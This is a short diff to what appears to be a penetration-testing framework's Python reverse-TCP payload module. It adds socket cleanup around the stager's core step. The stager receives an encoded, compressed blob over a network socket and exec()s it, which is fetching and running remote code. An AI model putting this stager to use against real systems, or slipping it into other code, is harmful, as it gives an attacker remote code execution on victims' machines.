@@ -72,7 +72,12 @@ module Payload::Python::ReverseTcp
     cmd << "d=s.recv(l)\n"
     cmd << "while len(d)<l:\n"
     cmd << "\td+=s.recv(l-len(d))\n"
-    cmd << "exec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"
+    # A forking stage leaves this descriptor in its service parent as well as
+    # its child. Close this process's copy when the stage returns or raises.
+    cmd << "try:\n"
+    cmd << "\texec(zlib.decompress(base64.b64decode(d)),{'s':s})\n"
+    cmd << "finally:\n"
+    cmd << "\ts.close()\n"
 
     py_create_exec_stub(cmd)
   end
